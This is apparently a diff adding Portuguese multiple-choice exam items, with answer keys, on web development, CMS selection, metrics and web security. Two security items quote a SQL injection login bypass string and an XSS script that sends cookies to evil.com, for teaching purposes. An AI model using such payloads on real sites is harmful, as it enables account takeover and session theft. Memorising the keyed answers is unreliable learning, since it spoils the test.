+    "id": "gestaoweb-cap3-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor está construindo um sistema de e-commerce e precisa decidir entre MySQL e MongoDB para armazenar os dados. O catálogo de produtos tem atributos variáveis — eletrônicos têm voltagem e frequência, roupas têm tamanho e material, livros têm ISBN e editora. Qual banco é mais adequado para essa necessidade específica?",
+    "alternativas": [
+      "MySQL é mais adequado: bancos relacionais são sempre superiores para e-commerce pois garantem integridade referencial entre produtos, pedidos e clientes — atributos variáveis podem ser resolvidos com uma tabela de atributos genéricos no MySQL, que é a solução padrão adotada por todos os grandes e-commerces mundiais.",
+      "MongoDB: documentos JSON deixam cada produto ter só os campos de que precisa, sem esquema fixo; no MySQL, seriam necessárias muitas colunas vazias ou uma estrutura complexa de tabelas.",
+      "Nenhum banco é adequado isoladamente: e-commerces modernos obrigatoriamente utilizam apenas Redis em memória para o catálogo de produtos, pois a velocidade de leitura é o fator mais crítico — MySQL e MongoDB são usados apenas para dados históricos de pedidos que não precisam de acesso rápido em tempo real.",
+      "A escolha entre MySQL e MongoDB não impacta o desenvolvimento: ambos armazenam dados e retornam consultas com performance equivalente para qualquer volume de dados — a decisão deve ser baseada exclusivamente na familiaridade da equipe com a linguagem de consulta, pois SQL e queries MongoDB são funcionalmente idênticos com sintaxes diferentes."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap3-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um estudante está aprendendo desenvolvimento web e pergunta qual a diferença entre usar jQuery e usar React para construir interfaces. Como explicar a distinção entre biblioteca e framework no contexto prático?",
+    "alternativas": [
+      "São a mesma coisa: o React apenas substituiu o jQuery a partir de 2015.",
+      "A distinção é apenas de tamanho: jQuery é uma biblioteca pequena para tarefas simples como animações e Ajax, enquanto React é maior e para projetos grandes — qualquer projeto com mais de 10 páginas deve usar React obrigatoriamente, e projetos menores sempre usam jQuery; não há diferença conceitual entre os dois, apenas de escala de uso.",
+      "jQuery é uma biblioteca de funções (DOM, animações, Ajax), e quem organiza o código é o desenvolvedor; o React também se define como biblioteca, mas impõe um modelo de componentes e estado que estrutura a aplicação, como um framework.",
+      "React e jQuery são igualmente adequados para qualquer projeto: a escolha deve ser baseada no framework de backend — projetos com Django no backend devem usar jQuery no frontend; projetos com Node.js no backend devem usar React; a compatibilidade entre frontend e backend é o único critério técnico relevante na decisão entre biblioteca e framework."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap3-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor define todas as larguras do layout em pixels fixos: div { width: 1200px; }. Um usuário com celular de 375px de largura reclama que o site está quebrado. Qual é o problema técnico e como o design responsivo resolveria?",
+    "alternativas": [
+      "O problema é de servidor: pixels fixos causam sobrecarga no processamento do servidor pois o HTML precisa ser recalculado para cada tamanho de tela — a solução é usar serverless functions que geram HTML diferente para cada dispositivo baseado no User-Agent detectado no cabeçalho HTTP da requisição.",
+      "Larguras fixas não se adaptam: 1200px em 375px estouram a tela e geram rolagem lateral; o responsivo usa unidades flexíveis (%, rem, vw), media queries e Flexbox ou Grid para reorganizar o layout.",
+      "Falta JavaScript: um window.resize que recalcule os pixels resolve.",
+      "Pixels fixos são a prática recomendada para garantir consistência visual: diferentes dispositivos têm densidades de pixel diferentes, e apenas valores em pixels físicos garantem que o layout apareça idêntico em todos os dispositivos — o problema relatado pelo usuário é de configuração do dispositivo, não de código, e deve ser resolvido nas configurações de zoom do navegador móvel."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap3-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe discute se deve adotar o conceito Mobile First para o novo sistema de gestão interno da empresa, que será usado exclusivamente em desktops por funcionários do escritório. O líder técnico questiona se faz sentido. Qual é a análise mais equilibrada?",
+    "alternativas": [
+      "Mobile First é obrigatório: o Google e o W3C penalizam qualquer sistema que não o siga.",
+      "Mobile First faz sentido quando o acesso móvel é relevante; num sistema interno usado só em desktop, projetar primeiro para o desktop aproveita melhor a tela, o mouse e o teclado.",
+      "Mobile First sempre produz interfaces superiores independentemente do contexto de uso: começar pelo menor dispositivo força os designers a priorizar o conteúdo essencial, resultando em interfaces mais limpas e focadas mesmo em desktop — equipes que adotam Desktop First sempre criam interfaces excessivamente complexas que prejudicam a produtividade dos usuários.",
+      "A escolha entre Mobile First e Desktop First não tem impacto técnico: são apenas filosofias de design sem diferença prática no código CSS ou na experiência do usuário — media queries funcionam igualmente bem em ambas as abordagens e o resultado final em termos de responsividade é idêntico independentemente de qual dispositivo foi priorizado no início do desenvolvimento."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap3-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um banco contrata Spring Boot para o backend de seu sistema de transações. Um colega sugere substituir por Laravel (PHP) por ser \"mais fácil\". Como avaliar tecnicamente essa decisão?",
+    "alternativas": [
+      "Laravel é sempre superior ao Spring Boot: PHP é mais leve e rápido que Java para qualquer aplicação web, e a facilidade de desenvolvimento com Laravel reduz o tempo de entrega sem comprometer performance — bancos que usam Java estão presos em tecnologias legadas do século passado sem justificativa técnica válida.",
+      "A sugestão faz sentido apenas se a equipe não conhece Java: frameworks são intercambiáveis para qualquer aplicação — Spring Boot e Laravel têm a mesma capacidade técnica, segurança e performance para sistemas bancários; a única diferença relevante é a linguagem, e a equipe deve sempre escolher o que conhece melhor independentemente do contexto.",
+      "\"Mais fácil\" não basta: Spring Boot traz tipagem estática, ecossistema maduro e uso consolidado em sistemas financeiros; trocar exigiria avaliar desempenho, conformidade, experiência da equipe e suporte.",
+      "Spring Boot e Laravel são equivalentes para sistemas bancários: a linguagem de programação não influencia a segurança ou performance de sistemas financeiros — bancos escolhem Java historicamente por inércia cultural, não por vantagens técnicas reais; frameworks modernos como Laravel com as configurações corretas de segurança atingem os mesmos padrões que Spring Boot."
+    ],
+    "correta": 2
+  },
+  {
+    "id": "gestaoweb-cap3-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor usa Firebase Realtime Database para um chat online. Quando um usuário envia mensagem, todos os participantes recebem instantaneamente sem recarregar a página. Qual característica do Firebase explica esse comportamento e como ele difere de um banco relacional como MySQL para esse caso de uso?",
+    "alternativas": [
+      "É só por estar nos servidores do Google; qualquer banco hospedado lá seria igual.",
+      "O Firebase sincroniza em tempo real: quem está inscrito nos dados recebe a atualização sem pedir; no MySQL o cliente precisa consultar, e o chat exigiria WebSockets ou polling no backend.",
+      "A diferença é apenas de localização dos dados: Firebase armazena dados no navegador do usuário em cache local, por isso a entrega é instantânea; MySQL armazena no servidor e precisa transmitir pela rede a cada mensagem — a solução para MySQL seria usar IndexedDB local no navegador como cache intermediário para atingir a mesma velocidade do Firebase.",
+      "Firebase e MySQL têm a mesma capacidade de tempo real: ambos suportam WebSockets nativamente e entregam dados com a mesma latência — a diferença é que Firebase tem uma API JavaScript mais simples de implementar no frontend, enquanto MySQL requer mais código no backend; para desenvolvedores experientes, MySQL é preferível pois oferece mais controle sobre os dados."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap3-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um time de desenvolvimento discute se usar Flexbox ou CSS Grid para o layout de um painel administrativo com sidebar fixa, área de conteúdo central com múltiplas colunas e rodapé. Qual é a orientação técnica correta?",
+    "alternativas": [
+      "Flexbox é sempre superior ao Grid para qualquer layout web moderno: o Grid foi criado antes do Flexbox e é considerado tecnologia legada — desenvolvedores modernos usam exclusivamente Flexbox para qualquer tipo de layout, desde botões simples até painéis administrativos complexos com múltiplas colunas.",
+      "Grid para a estrutura geral, que controla linhas e colunas ao mesmo tempo (sidebar, centro e rodapé); Flexbox para alinhar itens dentro de cada área; eles se complementam.",
+      "Tanto faz: qualquer layout de Grid se faz igual com Flexbox, e vice-versa.",
+      "CSS Grid deve ser evitado em sistemas administrativos por questões de compatibilidade: navegadores corporativos usados em empresas frequentemente são versões antigas do Internet Explorer que não suportam Grid — Flexbox tem compatibilidade retroativa superior e deve ser usado exclusivamente para garantir que o painel administrativo funcione em todos os navegadores do ambiente corporativo."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap3-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap3",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor precisa criar um sistema de e-commerce completo. Ele vai usar React no frontend, Node.js com Express no backend, MySQL para dados relacionais de pedidos e MongoDB para o catálogo de produtos. Um colega questiona por que usar dois bancos de dados diferentes. Qual é a justificativa técnica?",
+    "alternativas": [
+      "Usar dois bancos de dados é sempre desnecessário e aumenta a complexidade sem benefício: qualquer banco moderno — MySQL ou MongoDB — consegue armazenar qualquer tipo de dado com performance equivalente; a decisão de usar dois bancos é erro de arquitetura que deve ser corrigido escolhendo apenas um banco para toda a aplicação.",
+      "Cada banco faz o que faz melhor: MySQL garante integridade e transações ACID em pedidos e pagamentos, e MongoDB dá flexibilidade ao catálogo de atributos variáveis; é a chamada persistência poliglota.",
+      "Dois bancos são necessários apenas por questões de escalabilidade: MySQL e MongoDB têm os mesmos limites técnicos de armazenamento, portanto usar dois bancos não melhora a performance — a única justificativa válida é distribuir o volume de dados entre servidores diferentes para evitar que um único banco fique sobrecarregado com os dados de produtos e pedidos simultaneamente.",
+      "A combinação React + Node.js + MySQL + MongoDB é incompatível tecnicamente: Node.js só consegue conectar a um banco de dados por vez, sendo necessário reiniciar o servidor para alternar entre MySQL e MongoDB — aplicações com múltiplos bancos precisam obrigatoriamente de múltiplos servidores Node.js independentes, um para cada banco, tornando a arquitetura descrita pelo desenvolvedor tecnicamente inviável."
+    ],
+    "correta": 1
   },
   {
     "id": "gestaoweb-cap4-q1",
@@ -1373,6 +1823,156 @@
     "resolucao": "o cenário ilustra exatamente o risco citado pela Forrester: planejamento insuficiente do mapeamento de conteúdo e de suas dependências (nesse caso, URLs antigas amplamente referenciadas) gera perda de tráfego evitável. A resposta correta identifica tanto a causa (falta de mapeamento e de redirecionamentos) quanto a prática de mitigação (planejar redirecionamentos como parte do escopo do projeto). {{D}} é falso: a perda de tráfego por links quebrados é evitável com o planejamento adequado, como demonstra a própria recuperação da MundoTech após corrigir os redirecionamentos."
   },
   {
+    "id": "gestaoweb-cap4-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma pequena empresa de advocacia precisa de um site com página institucional, lista de serviços, blog jurídico e formulário de contato. O desenvolvedor sugere Drupal pela \"robustez e segurança superiores\". Avaliando os critérios de escolha de CMS, essa recomendação é adequada?",
+    "alternativas": [
+      "A recomendação é correta: segurança é o fator mais crítico para escritórios de advocacia que lidam com informações confidenciais de clientes — Drupal é a única opção aceitável para qualquer empresa que processe dados sensíveis, independentemente do tamanho ou complexidade do projeto.",
+      "É inadequada: o Drupal serve a projetos grandes com equipe técnica; para um site simples com blog, o WordPress tem ecossistema amplo, aprendizado fácil e plugins como Wordfence e Yoast, sem o custo e a complexidade do Drupal.",
+      "Só seria adequada com mais de 50 funcionários; o porte do escritório é o que decide.",
+      "Drupal e WordPress têm segurança equivalente para qualquer tipo de site: a escolha deve ser baseada exclusivamente no custo de hospedagem, já que ambos os CMS oferecem os mesmos plugins de segurança, a mesma facilidade de configuração e os mesmos recursos de proteção contra ataques cibernéticos."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma grande rede varejista com 80.000 produtos, operações em 5 países, diferentes moedas e integração com ERP corporativo avalia migrar para Shopify. Um arquiteto questiona se essa é a escolha adequada. Qual é a análise correta?",
+    "alternativas": [
+      "Shopify é a escolha ideal para qualquer e-commerce: a plataforma tem plano enterprise (Shopify Plus) que resolve todos os casos de uso, inclusive os mais complexos — multinacionais como Heinz e Gymshark usam Shopify, o que valida a escolha para qualquer operação independentemente da complexidade de integração ou volume de produtos.",
+      "O Shopify é limitado nesse caso: plataforma fechada, pouca customização, acesso restrito aos dados para integrar com o ERP e taxas por transação em alto volume; Magento (Adobe Commerce) ou solução própria se encaixam melhor.",
+      "Depende só do faturamento: até R$ 1 milhão por mês, Shopify; acima disso, Magento.",
+      "Shopify é inadequado apenas pela questão de múltiplas moedas: a plataforma não suporta conversão automática de moedas, o que é o único obstáculo real para operações multinacionais — todos os outros requisitos mencionados (80.000 produtos, ERP, 5 países) são facilmente resolvidos com os apps disponíveis na App Store da plataforma."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um jornalista independente quer criar uma publicação online com newsletter paga, conteúdo premium para assinantes e blog de análise política. Ele compara WordPress e Ghost. Qual é a avaliação técnica mais precisa para esse caso de uso?",
+    "alternativas": [
+      "WordPress é sempre superior ao Ghost: com 43,6% do mercado e plugins como MemberPress e Mailchimp, WordPress oferece toda a funcionalidade necessária — Ghost é uma plataforma experimental sem comprovação em grandes publicações e deve ser evitado por jornalistas que dependem da plataforma para sustento financeiro.",
+      "O Ghost se encaixa bem: membros e assinaturas com Stripe nativos, newsletter integrada, editor focado na escrita e boa performance; resolve sem os vários plugins que o WordPress exigiria.",
+      "As duas plataformas são tecnicamente equivalentes para publicações pagas: a escolha deve ser baseada exclusivamente no design dos temas disponíveis — Ghost tem templates mais modernos, mas WordPress tem mais opções; jornalistas sem preferência estética devem escolher WordPress pela maior comunidade de suporte disponível online.",
+      "Nenhuma das duas é adequada para monetização por assinaturas: plataformas de CMS não foram projetadas para gestão de pagamentos recorrentes — o jornalista deve usar Substack ou Patreon para monetização e apenas vincular o blog externo a essas plataformas, evitando a complexidade de configurar sistemas de pagamento em CMS generalistas."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma equipe de marketing cria conteúdo que passa por redator, revisor, gerente de marketing e aprovação jurídica antes de publicar. O CMS atual não tem controle de workflow. Quais problemas práticos isso causa e qual funcionalidade de gestão avançada resolveria?",
+    "alternativas": [
+      "A ausência de workflow não causa problemas práticos: equipes profissionais conseguem gerenciar aprovações por e-mail e WhatsApp sem necessidade de sistemas formais — sistemas de workflow em CMS são recursos de luxo utilizados apenas por grandes corporações com centenas de funcionários envolvidos na criação de conteúdo.",
+      "Sem workflow, conteúdo sai sem aprovação, perde-se o histórico e não se sabe quem aprovou; um fluxo com estágios (rascunho, revisão, aprovação, publicação), versões e permissões por papel garante que tudo passe pelas etapas.",
+      "O problema é exclusivamente de comunicação entre equipes, não de tecnologia: implementar um processo claro de aprovação por e-mail com templates padronizados e prazos definidos resolve completamente a questão sem necessidade de funcionalidades adicionais no CMS — sistemas de workflow adicionam complexidade burocrática que reduz a agilidade do time de marketing.",
+      "O único risco são erros de ortografia, resolvidos com um corretor automático no CMS."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m5",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um site de e-commerce tem taxa de conversão de 1,2%. O analytics mostra que 70% dos visitantes saem sem adicionar nada ao carrinho e o heatmap revela que o botão \"Comprar\" abaixo da dobra raramente é visto. Quais ações de UX e análise de métricas são indicadas?",
+    "alternativas": [
+      "É só SEO: as campanhas atraem o público errado, e a página não precisa mudar.",
+      "É problema de visibilidade: o botão abaixo da dobra não é visto; o certo é subir o CTA, testar variações com A/B, ver onde o interesse cai e checar a velocidade, decidindo com base nas métricas.",
+      "Taxa de conversão de 1,2% é completamente normal para e-commerce: médias do setor ficam entre 1% e 2%, portanto não há problema real a resolver — heatmaps mostram que usuários scrollam menos em mobile, o que é comportamento esperado e não deve gerar mudanças na estrutura da página ou posicionamento dos elementos de conversão.",
+      "O único problema identificado é de design visual: o botão \"Comprar\" provavelmente tem cor inadequada que não chama atenção — mudar a cor para laranja ou verde resolve o problema de visibilidade sem necessidade de reposicionamento na página ou análise mais profunda do comportamento dos usuários através de heatmaps e métricas de engajamento."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m6",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma empresa está migrando de Joomla para WordPress. O projeto tem 3.000 artigos, URLs estabelecidas indexadas no Google e extensões customizadas desenvolvidas especificamente para o Joomla. Quais são os principais riscos e boas práticas para essa migração?",
+    "alternativas": [
+      "Migração de CMS é processo simples e automático: todos os CMS modernos têm exportadores e importadores nativos que transferem conteúdo, configurações e extensões sem perda de dados — o único cuidado necessário é fazer backup antes de começar, e todo o processo leva menos de duas horas independentemente do volume de conteúdo.",
+      "Os riscos são perder posições no Google com URLs novas, perder funções das extensões próprias e corromper dados; as boas práticas são redirecionamentos 301, auditoria de funções, testes em staging e plano de rollback.",
+      "As URLs mudam, mas o Google reindexa tudo em 24 horas; basta migrar de uma vez no fim de semana.",
+      "Migração de Joomla para WordPress é contraindicada em qualquer caso: o custo e risco de migrar superam sempre os benefícios, especialmente com extensões customizadas — empresas com Joomla estabelecido devem manter a plataforma indefinidamente independentemente das limitações do ecossistema, pois a estabilidade do sistema existente sempre supera os benefícios de migrar para plataforma com ecossistema mais rico."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m7",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup de moda lança e-commerce e debate entre WooCommerce (WordPress) e Shopify. A equipe tem um desenvolvedor PHP experiente, orçamento limitado e planos de crescimento acelerado com customizações específicas de cálculo de frete e programa de fidelidade. Qual análise de custo-benefício é mais precisa?",
+    "alternativas": [
+      "Shopify é sempre a escolha correta para e-commerce de moda: a plataforma tem temas específicos para o setor, integração nativa com Instagram Shopping e TikTok, e a mensalidade fixa previsível facilita o planejamento financeiro de startups — desenvolvedores PHP são facilmente adaptáveis ao ecossistema Shopify sem curva de aprendizado significativa.",
+      "WooCommerce: o desenvolvedor já domina PHP e WordPress, frete e fidelidade podem ser feitos sem apps pagos, não há taxa por venda nem mensalidade fixa, e o controle do código acompanha o crescimento.",
+      "A decisão deve ser baseada exclusivamente no design dos temas: WooCommerce e Shopify têm capacidades técnicas idênticas para qualquer e-commerce — como a startup é de moda, o critério determinante é qual plataforma oferece templates mais adequados para apresentar roupas, já que customizações técnicas como frete e fidelidade são igualmente simples em ambas as plataformas.",
+      "Nenhuma das duas opções é adequada para startup com crescimento acelerado: o ideal é desenvolver e-commerce completamente do zero com framework como Laravel — a independência total do código próprio elimina limitações de qualquer CMS e permite customizações ilimitadas sem custo de licenciamento, sendo essa invariavelmente a escolha mais econômica a longo prazo para empresas com planos de crescimento."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m8",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "O Wix apresentou crescimento de mercado de 1.633% entre 2015 e 2025, enquanto o WordPress mantém 61,3% de participação. Um analista conclui que \"o Wix vai superar o WordPress em breve\". Qual análise crítica esse raciocínio merece?",
+    "alternativas": [
+      "O analista está correto: taxa de crescimento de 1.633% confirma que o Wix superará o WordPress nos próximos 2 a 3 anos — participação de mercado do WordPress tende a cair porque é tecnologia mais antiga e os usuários estão migrando para plataformas modernas com interface visual mais intuitiva como o Wix.",
+      "Confunde taxa de crescimento com tamanho: crescer 1.633% a partir de uma base pequena não supera quem tem 61,3%; além disso, os dois atendem públicos diferentes (customização profunda versus simplicidade) e coexistem.",
+      "Está certo, só erra o prazo: o Wix vai superar o WordPress em cerca de 10 anos.",
+      "Crescimento de mercado e participação de mercado são métricas equivalentes: 1.633% de crescimento significa que o Wix já tem mais sites ativos do que o WordPress — a aparente discrepância nos percentuais se explica por metodologias diferentes de contagem, e na realidade o Wix já é a plataforma dominante para novos sites criados em 2025 enquanto o WordPress mantém apenas sites legados."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m9",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um gestor analisa que o site da empresa tem posts com 5.000 visualizações mas 8 segundos de tempo médio na página, enquanto outro post tem 500 visualizações e 6 minutos de tempo médio. Qual é a interpretação correta dessas métricas e que ação é recomendada?",
+    "alternativas": [
+      "O post com 5.000 visualizações é claramente superior: volume de tráfego é a métrica mais importante no marketing digital — tempo na página é irrelevante pois usuários modernos consomem conteúdo de forma acelerada em dispositivos móveis; a empresa deve produzir mais conteúdo similar ao primeiro post para maximizar o volume de visitas ao site.",
+      "Muito tráfego e pouco tempo sugerem título que promete mais do que o texto entrega; pouco tráfego e 6 minutos indicam conteúdo valioso; melhore o primeiro texto e invista em SEO e divulgação do segundo.",
+      "As métricas se contradizem e não permitem conclusão, pois o tempo varia com o aparelho.",
+      "O problema em ambos os posts é exclusivamente de SEO técnico: 5.000 visualizações com baixo tempo indica URL não amigável que confunde os motores de busca, e 500 visualizações indica meta description mal escrita — reescrever as URLs e meta tags de ambos os posts resolverá simultaneamente o problema de engajamento e o problema de tráfego sem necessidade de alterar o conteúdo em si."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap4-m10",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap4",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Uma startup investiu 18 meses construindo um e-commerce no Wix, acumulando 500 produtos, histórico de pedidos e base de clientes. Agora precisa integrar com sistema ERP corporativo e desenvolver funcionalidades customizadas de precificação dinâmica. O CTO questiona a viabilidade. Qual é a análise técnica correta?",
+    "alternativas": [
+      "O Wix resolve completamente esses requisitos: a App Market tem integrações com todos os principais ERPs do mercado e o Wix Code (Velo) permite desenvolver qualquer funcionalidade customizada — a preocupação do CTO é infundada pois plataformas modernas como Wix foram desenvolvidas especificamente para escalar com as necessidades das empresas.",
+      "O CTO tem razão: o Wix limita o acesso aos dados, a integração com ERP e a customização do código; é o dilema das plataformas fechadas: migrar agora, com custo, ou conviver com limitações crescentes.",
+      "A solução é contratar mais desenvolvedores: qualquer limitação técnica do Wix é superável com equipe técnica suficientemente qualificada — o problema não é da plataforma mas da capacidade técnica atual da startup; com investimento adequado em recursos humanos, o Wix suporta integrações ERP e precificação dinâmica equivalentes a qualquer plataforma open-source do mercado.",
+      "Basta migrar hoje: o Wix exporta tudo para WooCommerce ou Shopify em menos de 24 horas."
+    ],
+    "correta": 1
+  },
+  {
     "id": "gestaoweb-cap5-q1",
     "disciplinaId": "gestao-de-sistemas-digitais-na-web",
     "capituloId": "gestaoweb-cap5",
@@ -1611,5 +2211,755 @@
     ],
     "correta": 1,
     "resolucao": "o critério de extraterritorialidade da LGPD, citado explicitamente no texto motivador, torna a lei aplicável ao tratamento de dados de pessoas localizadas no Brasil, mesmo por empresas sediadas no exterior e sem presença física no país, desde que haja oferta de bens ou serviços a esse público. {{D}} é falso: é perfeitamente possível — e, no caso descrito, provável — que a empresa esteja sujeita simultaneamente à LGPD (por atender usuários no Brasil) e ao GDPR (por estar sediada na União Europeia)."
+  },
+  {
+    "id": "gestaoweb-cap5-m1",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Em 2017, o Equifax sofreu vazamento de dados de 147 milhões de pessoas por uma falha em software desatualizado. Analisando os três pilares da segurança da informação (CIA Triad), quais foram violados e como cada um foi comprometido nesse incidente?",
+    "alternativas": [
+      "Apenas a confidencialidade foi violada: o vazamento expôs dados pessoais sem autorização, mas integridade e disponibilidade não foram afetadas pois os sistemas continuaram funcionando normalmente e nenhum dado foi alterado durante o incidente — a tríade CIA é violada integralmente apenas em ataques de ransomware que criptografam dados e derrubam sistemas.",
+      "Confidencialidade (dados de 147 milhões expostos); integridade (não há garantia de que nada foi alterado); disponibilidade (sistemas desligados na contenção); incidentes reais costumam atingir mais de um pilar.",
+      "Somente disponibilidade e integridade foram violadas: ataques de grande escala como o do Equifax visam exclusivamente derrubar sistemas e corromper dados — confidencialidade só é violada quando o atacante publica os dados roubados publicamente, o que não aconteceu imediatamente no caso Equifax, portanto esse pilar só foi comprometido depois, não durante o ataque original.",
+      "Nenhum dos três pilares foi tecnicamente violado no Equifax: o conceito de CIA Triad aplica-se a sistemas militares e governamentais — para empresas privadas como agências de crédito, a violação de segurança é avaliada exclusivamente por frameworks regulatórios como PCI-DSS e HIPAA, não pela tríade CIA que é um modelo acadêmico sem aplicação prática em incidentes corporativos."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m2",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um desenvolvedor cria um formulário de login que constrói a query SQL concatenando diretamente os valores digitados: \"SELECT * FROM users WHERE username='\" + user + \"' AND password='\" + pass + \"'\". Um testador digita admin' OR '1'='1' -- no campo de usuário. O que acontece e como a solução com prepared statements previne isso?",
+    "alternativas": [
+      "A entrada admin' OR '1'='1' -- causa apenas um erro de sintaxe SQL que impede o login: o banco de dados rejeita queries malformadas automaticamente com mensagem de erro — prepared statements resolvem esse problema de sintaxe mas não têm relação com segurança, sendo apenas uma boa prática de organização de código sem impacto na prevenção de SQL injection.",
+      "A query vira WHERE username='admin' OR '1'='1' --, que é sempre verdadeira, e o -- anula a senha; com prepared statements, o valor vai num placeholder e é tratado como dado, nunca como código SQL.",
+      "Só funciona se o atacante souber o nome exato de um usuário válido no banco.",
+      "Prepared statements não previnem SQL injection em formulários de login: eles apenas escapam caracteres especiais como aspas simples — a proteção real contra SQL injection requer usar procedimentos armazenados (stored procedures) no banco de dados que encapsulam as queries em camada separada, tornando impossível a injeção de código mesmo com concatenação direta de strings."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m3",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um fórum online permite que usuários postem comentários com HTML. Um atacante posta: <script>document.location='https://evil.com/steal?c='+document.cookie</script>. Classifique o tipo de XSS e explique por que é mais perigoso que o XSS refletido.",
+    "alternativas": [
+      "É XSS refletido, e menos grave, pois só afeta quem postou o comentário.",
+      "É XSS armazenado: o script fica salvo e roda no navegador de cada visitante do comentário; é pior que o refletido porque ninguém precisa clicar em link, e um único post atinge milhares de pessoas.",
+      "É XSS baseado em DOM: o script manipula o Document Object Model do fórum sem envolver o servidor — é o tipo mais perigoso porque é completamente invisível nos logs do servidor e não pode ser detectado por WAFs ou sistemas de monitoramento de rede, tornando a identificação e remoção do código malicioso praticamente impossível sem análise manual do código-fonte cliente.",
+      "O exemplo dado não configura XSS pois usa redirecionamento de location ao invés de manipulação direta de conteúdo da página: XSS verdadeiro só ocorre quando o script modifica o DOM visualmente — redirecionamentos e roubo de cookies são classificados como session hijacking, uma categoria de ataque separada que exige contramedidas diferentes das aplicadas contra XSS."
+    ],
+    "correta": 1
+  },
+  {
+    "id": "gestaoweb-cap5-m4",
+    "disciplinaId": "gestao-de-sistemas-digitais-na-web",
+    "capituloId": "gestaoweb-cap5",
+    "tipo": "objetiva",
+    "nivel": "medio",
+    "enunciado": "Um banco implementa cookies de sessão sem os atributos HttpOnly, Secure e SameSite. Um pesquisador de segurança demonstra três ataques distintos que cada ausência permite. Qual é a análise correta de cada flag e o ataque que previne?",
+    "alternativas": [
+      "As três flags são configurações cosméticas sem impacto de segurança real: browsers modernos implementam proteções automáticas contra roubo de cookies independentemente desses atributos — HttpOnly, Secure e SameSite foram importantes em versões antigas de browsers (IE6, Firefox 2) mas tornaram-se obsoletos com a evolução dos navegadores que já aplicam essas proteções por padrão.",
